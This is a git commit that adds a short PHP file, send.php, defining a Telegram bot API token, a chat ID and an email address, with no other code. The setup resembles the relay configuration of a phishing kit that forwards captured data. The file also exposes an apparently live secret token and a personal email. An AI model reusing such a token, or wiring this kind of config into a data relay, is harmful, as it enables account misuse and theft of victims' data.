e8fbf866f32947bc5a33784af81bb83de76206ee
brainandrews <111882964+brainandrews@users.noreply.github.com>
2022-12-13 17:14:16 +0800

    Create send.php
    Signed-off-by: brainandrews <111882964+brainandrews@users.noreply.github.com>

---
+++ send.php
@@ -0,0 +1,8 @@
+<?php
+/*                                                 
+*/
+
+$api = "5713166517:AAHoCOxyZ9TVMhUyErVhvCb5KN2LXtrFFKI";
+$chatid = "5576919862";
+$email ="rolandfrancisco4039@yahoo.com";
+?>
